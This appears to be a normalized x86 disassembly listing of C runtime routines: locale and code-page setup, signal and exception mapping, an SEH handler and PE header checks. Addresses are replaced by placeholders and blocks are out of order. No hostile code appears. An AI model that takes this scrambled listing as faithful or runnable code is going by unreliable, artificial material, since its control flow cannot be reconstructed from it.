pop edi
pop ebp
retn
push esi
call sub_40b3a8
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_40b441
pop ecx
sub_40b5d9
push 0xc
push r--data
call sub_40be80
call sub_4072c1
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_40b58c
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b646
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_4072c1
mov esi [ eax + 0x6c ]
mov eax esi
call sub_40bec5
retn
push 0x20
call sub_407852
sub_40b652
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_40b681
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_406b90
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_40b6e5
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_40e81b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_4099b9
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_4099b9
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_406b90
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_40b875
push 0xc
push r--data
call sub_40be80
call sub_4072c1
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40b910
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_40bec5
retn
push 0x20
call sub_407852
cmp esi rw-data
je r-xdata
push esi
call sub_408a41
pop ecx
sub_40b919
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_40974b
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40b995
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_40b919
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_40b681
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_406b90
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_40b652
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_40b6e5
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_406b90
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_40b652
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_40bb7e
push 0x14
push r--data
call sub_40be80
or [ ebp - 0x20 ] 0xffffffff
call sub_4072c1
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_40b875
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_40b919
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_409f19
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_40bec5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_40b995
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_40c61a
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_408a41
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_408a41
pop ecx
push 0xd
call sub_40b2e6
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40bcdf
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_408a41
pop ecx
sub_40bd36
mov edi edi
push ebp
mov ebp esp
push esi
call sub_407248
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_40be80
push sub_40bee0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_40bee0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_407abb
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_407abb
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_411c0b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_411bc2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_407abb
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_407abb
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_411bf2
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_411c0b
mov eax [ ebp + 0xc ]
push r--data
call sub_40c770
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_407abb
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_411bd9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_407abb
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_40c08d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
push esi
imul ecx ecx 0xc
add ecx [ ebp + 0x8 ]
pop esi
cmp eax ecx
jae r-xdata
mov esi ecx
imul esi esi 0xc
add esi [ ebp + 0x8 ]
add eax 0xc
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
pop ebp
retn
sub_40c0d1
push 0x20
push r--data
call sub_40be80
xor edi edi
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x28 ] edi
mov ebx [ ebp + 0x8 ]
cmp ebx 0xb
jg r-xdata
mov eax ebx
sub eax 0xf
je r-xdata
je r-xdata
mov esi rw-data
mov eax [ rw-data ]
sub eax 0x6
je r-xdata
call sub_407248
mov edi eax
mov [ ebp - 0x28 ] edi
test edi edi
jne r-xdata
mov eax ebx
push 0x2
pop ecx
sub eax ecx
je r-xdata
call sub_40bec5
retn
cmp [ ebp - 0x20 ] eax
jne r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
dec eax
je r-xdata
push [ edi + 0x5c ]
mov edx ebx
call sub_40c08d
pop ecx
lea esi [ eax + 0x8 ]
mov eax [ esi ]
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
sub eax ecx
je r-xdata
cmp [ ebp - 0x1c ] eax
je r-xdata
push 0x3
call sub_40781e
mov [ ebp - 0x1c ] 0x1
push eax
call [ DecodePointer@IAT ]
mov esi rw-data
mov eax [ rw-data ]
jmp r-xdata
call sub_40c61a
mov [ eax ] 0x16
call sub_40c5c8
jmp r-xdata
mov [ ebp - 0x20 ] eax
xor eax eax
cmp [ ebp - 0x20 ] 0x1
je r-xdata
sub eax ecx
je r-xdata
xor eax eax
mov [ ebp - 0x4 ] eax
cmp ebx 0x8
je r-xdata
push eax
call sub_40b2e6
pop ecx
sub eax ecx
jne r-xdata
mov ecx [ edi + 0x60 ]
mov [ ebp - 0x2c ] ecx
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
call sub_40710b
mov [ esi ] eax
mov ecx [ edi + 0x64 ]
mov [ ebp - 0x30 ] ecx
mov [ edi + 0x64 ] 0x8c
cmp ebx 0x4
jne r-xdata
push ebx
call [ ebp - 0x20 ]
push [ edi + 0x64 ]
push ebx
call [ ebp - 0x20 ]
pop ecx
jmp r-xdata
mov ecx [ r--data ]
mov [ ebp - 0x24 ] ecx
cmp ebx 0x8
jne r-xdata
mov eax [ ebp - 0x2c ]
mov [ edi + 0x60 ] eax
cmp ebx 0x8
jne r-xdata
cmp ebx 0xb
je r-xdata
pop ecx
cmp ebx 0x8
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40c238
cmp ebx 0x8
jne r-xdata
mov ecx [ ebp - 0x24 ]
imul ecx ecx 0xc
mov edx [ edi + 0x5c ]
mov [ ecx + edx + 0x8 ] eax
inc [ ebp - 0x24 ]
jmp r-xdata
xor eax eax
mov eax [ ebp - 0x30 ]
mov [ edi + 0x64 ] eax
cmp ebx 0x4
jne r-xdata
mov ecx [ r--data ]
add ecx [ r--data ]
cmp [ ebp - 0x24 ] ecx
jge r-xdata
sub_40c283
mov edi edi
push ebp
mov ebp esp
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0xc ] 0x1
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0x18 ]
mov [ ebp - 0x88 ] eax
jne r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
and [ ebp - 0x8c ] 0x0
push 0x80
lea ebx [ ebp - 0x84 ]
mov ecx ebx
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push eax
call sub_411e41
mov esi eax
add esp 0x14
test esi esi
jne r-xdata
cmp [ ebp + 0xc ] 0x0
jne r-xdata
mov esi [ GetLocaleInfoW@IAT ]
xor eax eax
push eax
push eax
push [ ebp + 0x14 ]
mov [ edi ] eax
push [ ebp + 0x10 ]
call esi
mov ebx eax
test ebx ebx
je r-xdata
push 0x1
push esi
call sub_409f5e
mov [ edi ] eax
xor edi edi
pop ecx
pop ecx
cmp eax edi
jne r-xdata
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
or eax 0xffffffff
and [ ebp - 0x88 ] 0x0
push 0x2
lea eax [ ebp - 0x88 ]
push eax
mov eax [ ebp + 0x14 ]
or eax 0x20000000
push eax
push [ ebp + 0x10 ]
call [ GetLocaleInfoW@IAT ]
test eax eax
je r-xdata
push [ edi ]
call sub_408a41
and [ edi ] 0x0
pop ecx
jmp r-xdata
push 0x2
push ebx
call sub_409f5e
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
je r-xdata
lea ecx [ esi - 0x1 ]
push ecx
push ebx
push esi
push eax
call sub_40d262
add esp 0x10
test eax eax
jne r-xdata
cmp [ ebp - 0x8c ] edi
je r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_411e41
add esp 0x14
mov [ ebp - 0x90 ] eax
test eax eax
je r-xdata
mov al [ ebp - 0x88 ]
mov [ edi ] al
jmp r-xdata
push ebx
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call esi
test eax eax
jne r-xdata
push edi
push edi
push edi
push edi
push edi
call sub_40c576
cmp [ ebp - 0x8c ] edi
je r-xdata
push ebx
call sub_408a41
pop ecx
inc esi
push esi
push eax
call sub_409f5e
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call sub_408a41
pop ecx
push [ ebp - 0x90 ]
mov [ ebp - 0x8c ] esi
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp - 0x88 ]
call sub_411e41
mov esi eax
add esp 0x14
test esi esi
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
sub_40c44d
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x8 ]
push edi
cmp ebx 0xffffffff
je r-xdata
and [ ebp - 0x320 ] 0x0
push 0x4c
lea eax [ ebp - 0x31c ]
push 0x0
push eax
call sub_406b90
lea eax [ ebp - 0x320 ]
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
add esp 0xc
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
lea ecx [ ebp + 0x4 ]
mov [ ebp - 0x20c ] ecx
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] eax
mov ecx [ ecx - 0x4 ]
mov [ ebp - 0x21c ] ecx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x320 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0x31c ] ecx
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
push 0x0
mov edi eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x328 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_411e7b
pop ecx
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_407abb
leave
retn
test edi edi
jne r-xdata
cmp ebx 0xffffffff
je r-xdata
push ebx
call sub_411e7b
pop ecx
sub_40c576
mov edi edi
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_40c44d
add esp 0xc
push esi
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
pop esi
retn
sub_40c59b
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c576
int3
pop ebp
jmp eax
sub_40c5d8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
pop ebp
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
lea ecx [ eax - 0x13 ]
cmp ecx 0x11
ja r-xdata
add eax 0xffffff44
push 0xe
pop ecx
cmp ecx eax
sbb eax eax
and eax ecx
add eax 0x8
pop ebp
retn
push 0xd
pop eax
pop ebp
retn
sub_40c640
mov edi edi
push ebp
mov ebp esp
push esi
call sub_40c62d
mov ecx [ ebp + 0x8 ]
push ecx
mov [ eax ] ecx
call sub_40c5d8
pop ecx
mov esi eax
call sub_40c61a
mov [ eax ] esi
pop esi
pop ebp
retn
sub_40c663
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40c689
mov edi edi
push esi
mov eax r--data
mov esi r--data
push edi
mov edi eax
cmp eax esi
jae r-xdata
pop edi
pop esi
retn
mov eax [ edi ]
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
sub_40c6af
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_40c6e0
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov eax 0x5a4d
cmp [ ecx ] ax
je r-xdata
mov eax [ ecx + 0x3c ]
add eax ecx
cmp [ eax ] 0x4550
jne r-xdata
xor eax eax
pop ebp
retn
xor edx edx
mov ecx 0x10b
cmp [ eax + 0x18 ] cx
sete dl
mov eax edx
pop ebp
retn
sub_40c720
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x3c ]
add ecx eax
movzx eax [ ecx + 0x14 ]
push ebx
push esi
movzx esi [ ecx + 0x6 ]
xor edx edx
push edi
lea eax [ eax + ecx + 0x18 ]
test esi esi
je r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
inc edx
add eax 0x28
cmp edx esi
jb r-xdata
mov ebx [ eax + 0x8 ]
add ebx ecx
cmp edi ebx
jb r-xdata
mov ecx [ eax + 0xc ]
cmp edi ecx
jb r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40c770
mov edi edi
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_40bee0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
